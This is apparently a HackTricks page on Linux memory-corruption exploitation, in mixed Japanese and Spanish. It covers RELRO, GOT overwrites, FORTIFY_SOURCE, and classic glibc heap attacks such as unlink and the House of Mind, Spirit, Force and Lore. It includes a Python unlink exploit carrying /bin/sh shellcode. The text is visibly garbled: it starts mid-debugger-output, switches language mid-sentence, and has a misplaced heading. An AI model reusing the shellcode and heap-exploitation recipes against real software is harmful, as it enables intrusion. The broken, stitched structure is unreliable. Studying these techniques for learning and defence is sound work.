0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gef➤  p fgets
$2 = {char *(char *, int, FILE *)} 0x7ffff7e4d100 <_IO_fgets>
gef➤  search-pattern 0x7ffff7e4d100
[+] Searching '\x00\xd1\xe4\xf7\xff\x7f' in memory
[+] In '/tmp/tryc'(0x555555557000-0x555555558000), permission=r--
0x555555557fd0 - 0x555555557fe8  →   "\x00\xd1\xe4\xf7\xff\x7f[...]"
```
リロなし：
```bash
gef➤  vmmap
Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-- /tmp/try
0x0000000000401000 0x0000000000402000 0x0000000000001000 r-x /tmp/try
0x0000000000402000 0x0000000000403000 0x0000000000002000 r-- /tmp/try
0x0000000000403000 0x0000000000404000 0x0000000000002000 r-- /tmp/try
0x0000000000404000 0x0000000000405000 0x0000000000003000 rw- /tmp/try
0x0000000000405000 0x0000000000426000 0x0000000000000000 rw- [heap]
0x00007ffff7dcb000 0x00007ffff7df0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df0000 0x00007ffff7f63000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f63000 0x00007ffff7fac000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fac000 0x00007ffff7faf000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7faf000 0x00007ffff7fb2000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb2000 0x00007ffff7fb8000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gef➤  p fgets
$2 = {char *(char *, int, FILE *)} 0x7ffff7e4d100 <_IO_fgets>
gef➤  search-pattern 0x7ffff7e4d100
[+] Searching '\x00\xd1\xe4\xf7\xff\x7f' in memory
[+] In '/tmp/try'(0x404000-0x405000), permission=rw-
0x404018 - 0x404030  →   "\x00\xd1\xe4\xf7\xff\x7f[...]"
```
バイナリの**relroなし**の場合、`fgets`の`got`エントリのアドレスは`0x404018`であることがわかります。メモリマッピングを見ると、これは`0x404000`と`0x405000`の間にあり、**`rw`の権限**を持っていることがわかります。つまり、読み書きが可能です。一方、**relroあり**のバイナリでは、バイナリの実行時の`got`テーブルのアドレス（pieが有効なので、このアドレスは変わります）は`0x555555557fd0`です。このバイナリのメモリマッピングでは、`0x0000555555557000`と`0x0000555555558000`の間にあり、メモリの**権限は`r`**であり、読み取りのみが可能です。

では、**回避策**は何でしょうか？私が通常使用する回避策は、relroによって読み取り専用になるメモリ領域に書き込まず、**別の方法でコード実行を行う**ことです。

なお、これが実現するためには、バイナリが実行前に関数のアドレスを事前に知っている必要があります。

- 遅延バインディング：関数のアドレスは、関数が初めて呼び出されるときに検索されます。したがって、実行中にGOTに書き込み権限が必要です。
- すぐにバインド：関数のアドレスは実行の初めに解決され、その後、.got、.dtors、.ctors、.dynamic、.jcrなどの重要なセクションに読み取り専用の権限が与えられます。`` `** ``-z relro`**`y`**`-z now\`\*\*

プログラムがすぐにバインドを使用しているかどうかを確認するには、次のコマンドを実行します。
```bash
readelf -l /proc/ID_PROC/exe | grep BIND_NOW
```
## Linux Exploiting Basic ESP

メモリにバイナリがロードされ、関数が初めて呼び出されると、PLT（Procedure Linkage Table）にジャンプし、GOTにジャンプしてそのエントリが解決されていないことを確認します（PLTの次のアドレスを含んでいます）。そのため、ランタイムリンカまたはrtfdを呼び出してアドレスを解決し、GOTに保存します。

関数が呼び出されると、PLTが呼び出され、関数のアドレスが格納されているGOTのアドレスにフローがリダイレクトされ、関数が呼び出されます。ただし、関数が初めて呼び出される場合、GOTにはPLTの次の命令が格納されているため、フローはPLTのコード（rtfd）に従い、関数のアドレスを取得し、GOTに保存して呼び出します。

バイナリをメモリにロードすると、コンパイラはプログラムを実行する際にロードする必要のあるデータのオフセットを指示します。

遅延バインディング（Lazy binding）- 関数のアドレスは、その関数が初めて呼び出されるときに検索されるため、GOTは書き込み許可があり、検索時にそこに保存され、再度検索する必要がありません。

即時バインディング（Bind now）- プログラムのロード時に関数のアドレスが検索され、.got、.dtors、.ctors、.dynamic、.jcrセクションのパーミッションが読み取り専用に変更されます。**-z relro**および**-z now**

しかし、一般的にプログラムはこれらのオプションで複雑になっていないため、これらの攻撃は依然として可能です。

**readelf -l /proc/ID_PROC/exe | grep BIND_NOW** - BIND NOWを使用しているかどうかを確認するためのコマンド

**Fortify Source -D_FORTIFY_SOURCE=1 or =2**

安全でないコピー関数を特定し、安全な関数に置き換えます。

例えば:\
char buf[16];\
strcpy(buf, source);

これを安全でないと判断し、strcpy()を\_\_strcpy\_chk()に置き換えます。バッファのサイズを最大コピーサイズとして使用します。

**=1**と**=2**の違いは次のとおりです:

2番目のオプションでは、**%n**が書き込み許可のあるセクションから来ないようにします。また、引数の直接アクセスパラメータは、前述のオプションを使用している場合にのみ使用できます。つまり、**%2$d**と**%1$d**を使用した後にのみ**%3$d**を使用できます。

エラーメッセージを表示するためには、argv\[0\]を使用します。そのため、他の場所（グローバル変数など）のアドレスをargv\[0\]に設定すると、エラーメッセージにその変数の内容が表示されます。ページ191

**Libsafeの置き換え**

次のコマンドで有効になります: LD\_PRELOAD=/lib/libsafe.so.2\
または\
“/lib/libsave.so.2” > /etc/ld.so.preload

いくつかの安全でない関数呼び出しを安全な関数呼び出しに置き換えます。標準化されていません（x86のみ、-fomit-frame-pointerでのコンパイル、静的コンパイル、すべての脆弱な関数が安全になるわけではない、LD\_PRELOADはsuid付きバイナリでは機能しません）。

**ASCII Armored Address Space**

共有ライブラリを0x00000000から0x00ffffffまでロードすることで、常に0x00バイトが存在するようにします。ただし、これはほとんどの攻撃を防ぐことはできず、特にリトルエンディアンでは効果がありません。

**ret2plt**

ROPを使用して、strcpy@plt（pltの関数）を呼び出し、GOTのエントリを指し、呼び出したい関数（system()）の最初のバイトをコピーします。その後、GOT+1を指し、system()の2番目のバイトをコピーします... 最後に、GOTに保存されているアドレス（system()）を呼び出します。

**Fake EBP**

EBPを引数を指すためのレジスタとして使用する関数では、EIPを変更してsystem()を指すようにするために、EBPも変更する必要があります。EBPを2バイトの任意の値を持つメモリ領域を指すように変更し、その後に&"/bin/sh"のアドレスを指す必要があります。

**chroot()によるジェイル**

debootstrap -arch=i386 hardy /home/user - 特定のサブディレクトリに基本システムをインストールします。

管理者は、mkdir foo; chroot foo; cd .. を実行することで、ジェイルから抜け出すことができます。

**コードインストゥルメンテーション**

Valgrind - エラーを検出します\
Memcheck\
RAD（Return Address Defender）\
Insure++

## 8 Heap Overflows: Exploits básicos

**割り当てられたチャンク**

prev\_size |\
size | - ヘッダー\
\*mem | データ

**フリーチャンク**

prev\_size |\
size |\
\*fd | フォワードチャンクへのポインタ\
\*bk | バックチャンクへのポインタ - ヘッダー\
\*mem | データ

フリーチャンクは、ダブルリンクリスト（bin）にあり、2つのフリーチャンクが連続して存在することはありません（結合されます）。

「size」には、前のチャンクが使用中であるか、mmap()で割り当てられたか、プライマリアリーナに属しているかを示すビットがあります。

チャンクを解放すると、隣接するチャンクがフリーである場合、これらはunlink()マクロを使用して結合され、最大の新しいチャンクがfrontlink()に渡され、適切なbinに挿入されます。

unlink(){\
BK = P->bk; - 新しいチャンクのBKは以前にフリーだったもののBKです\
FD = P->fd; - 新しいチャンクのFDは以前にフリーだったもののFDです\
FD->bk = BK; - 次のチャンクのBKは新しいチャンクを指します\
BK->fd = FD; - 前のチャンクのFDは新しいチャンクを指します\
}

したがって、P->bkをシェルコードのアドレスで、P->fdをGOTまたはDTORSのエントリのアドレスから12を引いたアドレスで変更できれば、次のことが実現できます：

BK = P->bk = &shellcode\
FD = P->fd = &\_\_dtor\_end\_\_ - 12\
FD->bk = BK -> \*((&\_\_dtor\_end\_\_ - 12) + 12) = &shellcode

これにより、プログラムの終了時にシェルコードが実行されます。

さらに、unlink()の4番目の文は何かを書き込むため、シェルコードはこれに対応する必要があります：

BK->fd = FD -> \*(\&shellcode + 8) = (&\_\
Después de la shell code metemos relleno hasta llegar al campo prev\_size y size del siguiente trozo. En estos sitios metemos 0xfffffff0 (de forma que se sobrescrita el prev\_size para que tenga el bit que dice que está libre) y “-4“(0xfffffffc) en el size (para que cuando compruebe en el 3º trozo si el 2º estaba libre en realidad vaya al prev\_size modificado que le dirá que s´está libre) -> Así cuando free() investigue irá al size del 3º pero en realidad irá al 2º - 4 y pensará que el 2º trozo está libre. Y entonces llamará a **unlink()**.

Al llamar a unlink() usará como P->fd los primeros datos del 2º trozo por lo que ahí se meterá la dirección que se quieres sobreescribir - 12(pues en FD->bk le sumará 12 a la dirección guardada en FD) . Y en esa dirección introducirá la segunda dirección que encuentre en el 2º trozo, que nos interesará que sea la dirección a la shellcode(P->bk falso).

**from struct import \***

**import os**

**shellcode = "\xeb\x0caaaabbbbcccc" #jm 12 + 12bytes de relleno**

**shellcode += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \\**

**"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \\**

**"\x80\xe8\xdc\xff\xff\xff/bin/sh";**

**prev\_size = pack("\<I”, 0xfffffff0) #Interesa que el bit que indica que el anterior trozo está libre esté a 1**

**fake\_size = pack("\<I”, 0xfffffffc) #-4, para que piense que el “size” del 3º trozo está 4bytes detrás (apunta a prev\_size) pues es ahí donde mira si el 2º trozo está libre**

**addr\_sc = pack("\<I", 0x0804a008 + 8) #En el payload al principio le vamos a poner 8bytes de relleno**

**got\_free = pack("\<I", 0x08048300 - 12) #Dirección de free() en la plt-12 (será la dirección que se sobrescrita para que se lanza la shellcode la 2º vez que se llame a free)**

**payload = "aaaabbbb" + shellcode + "b"\*(512-len(shellcode)-8) # Como se dijo el payload comienza con 8 bytes de relleno porque sí**

**payload += prev\_size + fake\_size + got\_free + addr\_sc #Se modifica el 2º trozo, el got\_free apunta a donde vamos a guardar la direccion addr\_sc + 12**

**os.system("./8.3.o " + payload)**

**unset() liberando en sentido inverso (wargame)**

Estamos controlando 3 chunks consecutivos y se liberan en orden inverso al reservado.

En ese caso:

En el chunck c se pone el shellcode

El chunck a lo usamos para sobreescribir el b de forma que el el size tenga el bit PREV\_INUSE desactivado de forma que piense que el chunck a está libre.

Además, se sobreescribe en la cabecera b el size para que valga -4.

Entonces, el programa se pensará que “a” está libre y en un bin, por lo que llamará a unlink() para desenlazarlo. Sin embargo, como la cabecera PREV\_SIZE vale -4. Se pensará que el trozo de “a” realmente empieza en b+4. Es decir, hará un unlink() a un trozo que comienza en b+4, por lo que en b+12 estará el puntero “fd” y en b+16 estará el puntero “bk”.

De esta forma, si en bk ponemos la dirección a la shellcode y en fd ponemos la dirección a la función “puts()”-12 tenemos nuestro payload.

**Técnica de Frontlink**

Se llama a frontlink cuando se libera algo y ninguno de sus trozos contiguos no son libres, no se llama a unlink() sino que se llama directamente a frontlink().

Vulnerabilidad útil cuando el malloc que se ataca nunca es liberado (free()).

Necesita:

Un buffer que pueda desbordarse con la función de entrada de datos

Un buffer contiguo a este que debe ser liberado y al que se le modificará el campo fd de su cabecera gracias al desbordamiento del buffer anterior

Un buffer a liberar con un tamaño mayor a 512 pero menor que el buffer anterior

Un buffer declarado antes del paso 3 que permita sobreescribir el prev\_size de este

De esta forma logrando sobres cribar en dos mallocs de forma descontrolada y en uno de forma controlada pero que solo se libera ese uno, podemos hacer un exploit.

**Vulnerabilidad double free()**

Si se llama dos veces a free() con el mismo puntero, quedan dos bins apuntando a la misma dirección.

En caso de querer volver a usar uno se asignaría sin problemas. En caso de querer usar otro, se le asignaría el mismo espacio por lo que tendríamos los punteros “fd” y “bk” falseados con los datos que escribirá la reserva anterior.

**After free()**

Un puntero previamente liberado es usado de nuevo sin control.

## **8 Heap Overflows: Exploits avanzados**

Las técnicas de Unlink() y FrontLink() fueron eliminadas al modificar la función unlink().

**The house of mind**

Solo una llamada a free() es necesaria para provocar la ejecución de código arbitrario. Interesa buscar un segundo trozo que puede ser desbordado por uno anterior y liberado.

Una llamada a free() provoca llamar a public\_fREe(mem), este hace:

mstate ar\_ptr;

mchunkptr p;

…

p = mem2chunk(mes); —> Devuelve un puntero a la dirección donde comienza el trozo (mem-8)

…

ar\_ptr = arena\_for\_chunk(p); —> chunk\_non\_main\_arena(ptr)?heap\_for\_ptr(ptr)->ar\_ptr:\&main\_arena \[1]

…

\_int\_free(ar\_ptr, mem);

}

En \[1] comprueba el campo size el bit NON\_MAIN\_ARENA, el cual se puede alterar para que la comprobación devuelva true y ejecute heap\_for\_ptr() que hace un and a “mem” dejando a 0 los 2.5 bytes menos importantes (en nuestro caso de 0x0804a000 deja 0x08000000) y accede a 0x08000000->ar\_ptr (como si fuese un struct heap\_info)
この方法では、例えば0x0804a000の領域を制御でき、0x081002a0の領域が解放されると、0x08100000のアドレスに自由に書き込むことができます。例えば、0x0804a000を書き込むことができます。この2番目の領域が解放されると、heap_for_ptr(ptr)->ar_ptrは0x08100000に書き込んだ内容を返します（0x081002a0に適用されるand演算から最初の4バイト、ar_ptrの値が取得されます）。

このように、\_int_free(ar_ptr, mem)が呼び出されます。つまり、\_int_free(0x0804a000, 0x081002a0)です。

\_int_free(mstate av, Void_t* mem){
…
bck = unsorted_chunks(av);
fwd = bck->fd;
p->bk = bck;
p->fd = fwd;
bck->fd = p;
fwd->bk = p;
}

前述のように、avの値を制御できることがわかりました。なぜなら、解放される領域に書き込むからです。

unsorted_chunksがどのように定義されているかを見ると、次のようになります。
bck = &av->bins[2]-8;
fwd = bck->fd = *(av->bins[2]);
fwd->bk = *(av->bins[2] + 12) = p;

したがって、av->bins[2]に\_\_DTOR\_END\_\_-12の値を書き込むと、最後の命令で\_\_DTOR\_END\_\_のアドレスが2番目の領域のアドレスに書き込まれます。

つまり、最初の領域の先頭には何度も\_\_DTOR\_END\_\_-12のアドレスを書き込む必要があります。av->bins[2]からそれを取得するためです。

2番目の領域のアドレスの末尾には、最後の5桁が0のアドレスに、最初の領域へのアドレスを書き込む必要があります。そうすることで、heap_for_ptr()はar_ptrが最初の領域の先頭にあると思い込み、av->bins[2]から値を取得します。

2番目の領域では、最初の領域を使ってprev_sizeをジャンプ0x0cで上書きし、sizeにはNON_MAIN_ARENAを有効にするための値を書き込みます。

その後、2番目の領域にはたくさんのnopsを配置し、最後にシェルコードを配置します。

このようにして、\_int_free(TROZO1, TROZO2)が呼び出され、\_\_DTOR\_END\_\_のprev_sizeのアドレスがTROZO2に書き込まれ、そこからシェルコードにジャンプします。

このテクニックを適用するには、いくつかの追加の要件を満たす必要があり、ペイロードがやや複雑になります。

このテクニックはもはや適用できません。unlinkとほぼ同じパッチが適用されました。新しいポインタが自身を指しているかどうかを比較します。

**Fastbin**

The house of mindのバリエーションです。

\_int\_free()関数の最初のチェックを通過した後に実行される次のコードを実行することが重要です。

fb = &(av->fastbins[fastbin_index(size)] —> fastbin_index(sz) —> (sz >> 3) - 2

…

p->fd = *fb

*fb = p

これにより、fbがGOT内の関数のアドレスを指すようにすることができます。このアドレスには、上書きする領域のアドレスが配置されます。これには、av->max_fastが上書きされるアドレスに近くにある必要があります。

The House of Mindでavの位置を制御できることがわかりました。

したがって、sizeフィールドに8 + NON_MAIN_ARENA + PREV_INUSEのサイズを設定すると、fastbin_index()はfastbins[-1]を返し、これはav->max_fastを指します。

この場合、av->max_fastは上書きされるアドレスです（指しているアドレスではなく、その位置が上書きされます）。

さらに、解放される隣接領域のサイズは8より大きくなければなりません。解放される領域のサイズが8であると述べたので、この偽の領域には8より大きいサイズを設定するだけです（さらに、シェルコードが解放される領域に配置されるため、最初にjmpが配置される必要があります）。

さらに、同じ偽の領域はav->system_memよりも小さくなければなりません。av->system_memはその上に1848バイトあります。

\_DTOR_END\_のヌル文字とGOT内のアドレスの数が少ないため、これらのセクションのどのアドレスも上書きには適していません。そのため、fastbinを使用してスタックを攻撃する方法を見てみましょう。

もう一つの攻撃方法は、avをスタックに向けることです。

サイズを8ではなく16に変更すると、fastbin_index()はfastbins[0]を返し、これを使用してスタックを上書きできます。

そのため、スタックにはcanaryや奇妙な値がない必要があります。実際、以下のような状態である必要があります：4バイトのヌル文字 + EBP + RET

4バイトのヌル文字は、avがこのアドレスにある必要があり、avの最初の要素はmutexeであり、値は0である必要があります。

av->max_fastはEBPとなり、制約をスキップするための値となります。

av->fastbins[0]はpのアドレスで上書きされ、RETとなり、シェルコードにジャンプします。

さらに、av->system_mem（スタック上の位置から1484バイト上にある）には、スキップするための十分なゴミがあります。

解放される隣接領域のサイズは8より大きくなければなりません。解放される領域のサイズが16であると述べたので、この偽の領域には8より大きいサイズを設定するだけです（さらに、新しい偽の領域のsizeフィールドの後に配置されるnopsにジャンプするjmpが配置される必要があります）。

**The House of Spirit**

この場合、攻撃者が変更可能なmallocのポインタ（例えば、オーバーフロー可能な変数の下にあるスタック上のポインタ）を持つ必要があります。

したがって、このポインタを任意の場所に指すようにすることができます。ただし、任意の場所が有効であるわけではありません。偽の領域のサイズはav->max_fastよりも小さくなければならず、より具体的には将来のmalloc()+8の呼び出しで要求されるサイズと同じでなければなりません。したがって、この脆弱なポインタの後にmalloc(40)が呼び出されることがわかっている場合、偽の領域のサイズは48とする必要があります。
## The House of Force

例えば、プログラムがユーザーに数値を尋ねる場合、48を入力し、変更可能なmallocポインタを次の4バイトに設定することができます（これは幸運な場合、EBPに属するかもしれませんので、48は後ろに残ります）。さらに、ptr-4+48のアドレスはいくつかの条件を満たす必要があります（この場合、ptr=EBPであるとします）、つまり、8 < ptr-4+48 < av->system_memです。

これが満たされる場合、私たちがmalloc(40)と指定した次のmallocが呼び出されると、そのアドレスにEBPのアドレスが割り当てられます。攻撃者がこのmallocに書き込むこともできる場合、EBPとEIPの両方を任意のアドレスで上書きすることができます。

これは、free()が呼び出されると、スタックのEBPを指すアドレスに新しいmalloc()のための完璧なサイズのチャンクがあることを保存するためですので、そのアドレスを割り当てます。

**The House of Force**

必要なもの：

- wildernessをオーバーフローさせるチャンク
- ユーザーが定義したサイズでのmalloc()の呼び出し
- ユーザーが定義したデータでのmalloc()の呼び出し

最初に行うことは、wildernessチャンクのサイズを非常に大きな値（0xffffffff）で上書きすることです。これにより、十分に大きなメモリ要求はヒープを拡張する必要なく、\_int\_malloc()で処理されます。

次に、av->topを攻撃者が制御するメモリ領域（スタックなど）を指すように変更します。av->topには\&EIP - 8が設定されます。

av->topを攻撃者が制御するメモリ領域を指すように上書きする必要があります：

victim = av->top;

remainder = chunck_at_offset(victim, nb);

av->top = remainder;

victimは現在のwildernessチャンクのアドレス（現在のav->top）を取得し、remainderはそのアドレスにmalloc()によって要求されたバイト数を加えたものです。したがって、\&EIP-8が0xbffff224にあり、av->topが0x080c2788を含んでいる場合、次のmalloc()でav->topが$EIP-8を指すようにするために制御されたmallocで予約する必要があるバイト数は次のとおりです：

0xbffff224 - 0x080c2788 = 3086207644.

これにより、変更された値がav->topに保存され、次のmallocがEIPを指し、上書きすることができます。

新しいwildernessチャンクのサイズが、最後のmalloc()によって要求されたサイズよりも大きいことが重要です。つまり、wildernessが\&EIP-8を指している場合、サイズはスタックのEBPフィールドにちょうど入ります。

**The House of Lore**

**SmallBinの破損**

解放されたチャンクは、サイズに基づいてbinに挿入されます。しかし、binに挿入される前に、unsorted binsに保持されます。チャンクが解放されると、すぐにbinに入れるのではなく、unsorted binsに残ります。その後、新しいチャンクが予約され、前の解放されたチャンクが使用できる場合はそれを返しますが、より大きなチャンクが予約されると、unsorted binsにある解放されたチャンクは適切なbinに入れられます。

脆弱なコードに到達するためには、メモリ要求がav->max_fast（通常72）よりも大きく、MIN_LARGE_SIZE（512）よりも小さい必要があります。

binに適切なサイズのチャンクがある場合、それを解除した後にそれを返します：

bck = victim->bk; // 前のチャンクを指す、唯一の変更可能な情報です。

bin->bk = bck; // 最後のチャンクになります。bckがスタックを指している場合、次の予約されたチャンクにこのアドレスが与えられます。

bck->fd = bin; // リストを閉じ、これがbinを指すようにします。

必要なもの：

- 2つのmallocを予約することで、2番目のmallocが解放され、binに挿入される前にオーバーフローを発生させることができます（つまり、オーバーフローする前に2番目のチャンクよりも大きなmallocを予約する必要があります）。
- 攻撃者が選んだアドレスを持つ予約されたmallocが攻撃者によって制御される必要があります。

目標は次のとおりです。解放されたチャンクの下にある解放されたチャンクにオーバーフローを発生させ、そのチャンクのbkポインタを変更する必要があります。bkポインタを変更し、そのチャンクがbinのリストの最初になり、予約されると、binはリストの最後のチャンク（次に提供されるチャンク）が偽のアドレス（スタックやGOTなど）にあると信じ込まされます。したがって、別のチャンクが予約され、攻撃者がそのチャンクにアクセス権を持っている場合、望ましい位置にチャンクが与えられ、書き込むことができます。

変更されたチャンクを解放した後、解放されたチャンクよりも大きなチャンクを予約する必要があります。これにより、変更されたチャンクがunsorted binsから出てきて、適切なbinに挿入されます。

binが再度使用されるまでに十分な回数のmalloc()が呼び出されるまで待つ必要があります。これにより、変更されたbinが使用され、binを欺いて次のチャンクが偽のアドレスにあると信じ込ませることができます。そして、望ましいチャンクが与えられます。

この攻撃をできるだけ早く実行するためには、次のような順序で行うことが理想的です：脆弱なチャンクの予約、変更されるチャンクの予約、このチャンクの解放、変更されるチャンクよりも大きなチャンクの予約、チャンクの変更（脆弱性）、脆弱なチャンクと同じサイズのチャンクの予約、および選択したアドレスを指す2番目の同じサイズのチャンクの予約。

この攻撃を防ぐために、通常のチェックが行われます。つまり、チャンクが「偽の」ものではないことを確認します：bck->fdがvictimを指しているかどうかを確認します。つまり、私たちの場合、スタックに指された偽のチャンクのfdポインタがvictimを指しているかどうかを確認します。
基本的には、ヒープにできるだけ多くのメモリを割り当て、これらをNopで終わるシェルコードのクッションで埋めます。また、クッションとして0x0cを使用します。したがって、アドレス0x0c0c0c0cにジャンプしようとします。したがって、このクッションで呼び出されるアドレスが上書きされる場合、そこにジャンプします。基本的な戦術は、最大限の予約を行い、ポインタが上書きされるかどうかを確認し、そこにジャンプすることです。そこにはNopがあることを期待しています。

**ヒープ風水**

予約と解放を使用して、メモリをセメント状に配置し、空きスペースの間に予約されたスペースが残るようにします。オーバーフローするバッファは、これらのスペースの1つに配置されます。

**objdump -d executable** —> 関数のDisas\
**objdump -d ./PROGRAMA | grep FUNCTION** —> 関数のアドレスを取得\
**objdump -d -Mintel ./shellcodeout** —> シェルコードが正しく表示され、OpCodeを取得するためのもの\
**objdump -t ./exec | grep varBss** —> シンボルテーブルから変数と関数のアドレスを取得するためのもの\
**objdump -TR ./exec | grep exit(func lib)** —> ライブラリの関数のアドレスを取得するためのもの (GOT)\
**objdump -d ./exec | grep funcCode**\
**objdump -s -j .dtors /exec**\
**objdump -s -j .got ./exec**\
**objdump -t --dynamic-relo ./exec | grep puts** —> GOTに上書きするputsのアドレスを取得するためのもの\
**objdump -D ./exec** —> 全てのPLTエントリまでのDisas\
**objdump -p -/exec**\
**Info functions strncmp —>** gdbで関数の情報を取得するためのもの

## おすすめのコース

* [https://guyinatuxedo.github.io/](https://guyinatuxedo.github.io)
* [https://github.com/RPISEC/MBE](https://github.com/RPISEC/MBE)

## **参考文献**

* [**https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html**](https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業で働いていますか？** HackTricksで**会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけて、独占的な[NFT](https://opensea.io/collection/the-peass-family)のコレクションを発見してください。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**をフォロー**してください。
* **ハッキングのトリックを共有するには、**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **にPRを提出**してください。

</details>
